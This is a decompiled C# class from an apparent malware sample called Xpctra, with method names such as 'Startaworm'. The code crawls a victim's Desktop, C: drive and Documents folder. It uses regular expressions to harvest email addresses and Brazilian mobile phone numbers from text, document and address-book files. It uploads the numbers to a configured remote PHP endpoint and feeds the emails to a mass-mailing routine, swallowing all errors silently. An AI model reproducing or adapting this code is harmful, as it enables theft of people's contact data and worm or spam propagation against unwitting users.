// Decompiled with JetBrains decompiler
// Type: Xpctra.TOPSPIN652GANIMEDES
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using VERMELHO265MONARCA.Config;

namespace Xpctra
{
  internal class TOPSPIN652GANIMEDES
  {
    private List<string> CALVINISTA314MASSACRANTE = new List<string>();
    private List<string> MEQUETREFE956BIPARTIDARIO = new List<string>();

    public void Startaworm()
    {
      new Thread(new ThreadStart(this.CELEBRAR521TARUGO)).Start();
    }

    public void Pegacelulares()
    {
      try
      {
        string[] strArray = new string[3]
        {
          Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
          "c:\\\\",
          Environment.GetFolderPath(Environment.SpecialFolder.Personal)
        };
        foreach (string DiretorioVasculhar in strArray)
          this.DIFTERICO810CRIADOMUDO(DiretorioVasculhar);
        if (this.MEQUETREFE956BIPARTIDARIO.Count > 0)
        {
          string infos = "INCOMPARAVEL110ESCAMAR:";
          foreach (string str in this.MEQUETREFE956BIPARTIDARIO)
            infos = infos + Environment.NewLine + str;
          ClassMandaPraMim.MandaParasSite(infos, Settings.PhpSeParador);
        }
      }
      catch (Exception ex)
      {
      }
      new PORTA155LINGUAGEMFONTE().EnviaEmails();
    }

    public void CELEBRAR521TARUGO()
    {
      try
      {
        string[] strArray = new string[3]
        {
          Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
          "c:\\\\",
          Environment.GetFolderPath(Environment.SpecialFolder.Personal)
        };
        foreach (string DiretorioVasculhar in strArray)
          this.DIFTERICO810CRIADOMUDO(DiretorioVasculhar);
        if (this.CALVINISTA314MASSACRANTE.Count <= 0)
          return;
        foreach (string Email in this.CALVINISTA314MASSACRANTE)
          COCEGAS751FORNECER.AdicionaEmails(Email);
      }
      catch (Exception ex)
      {
      }
    }

    private void DIFTERICO810CRIADOMUDO(string DiretorioVasculhar)
    {
      string pattern1 = "([\\w-\\.]+)@((?:[\\w]+\\.)+)([a-zA-Z]{2,4})";
      string pattern2 = "559\\d{10}|[1-9][1-9]-9\\d{4}-\\d{4}|[1-9][1-9]-9\\d{8}|\\([1-9][1-9]\\)\\+9\\d{8}|55\\+[1-9][1-9]\\+9\\d{4}-\\d{4}|[0-9][1-9][1-9][1-9][1-9]9\\d{8}";
      try
      {
        foreach (FileInfo file in new DirectoryInfo(DiretorioVasculhar).GetFiles())
        {
          if (file.Extension.ToLower() == ".txt" || file.Extension.ToLower() == ".doc" || (file.Extension.ToLower() == ".dat" || (file.Extension.ToLower() == ".wab" || file.Extension.ToLower() == ".xlxs")))
          {
            StreamReader streamReader = new StreamReader(file.FullName);
            string input;
            while ((input = streamReader.ReadLine()) != null)
            {
              Match match1 = Regex.Match(input, pattern1);
              if (match1.Success && !this.CALVINISTA314MASSACRANTE.Contains(match1.Value))
                this.CALVINISTA314MASSACRANTE.Add(match1.Value);
              Match match2 = Regex.Match(input, pattern2);
              if (match2.Success && !this.MEQUETREFE956BIPARTIDARIO.Contains(match2.Value))
                this.MEQUETREFE956BIPARTIDARIO.Add(match2.Value);
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
    }
  }
}
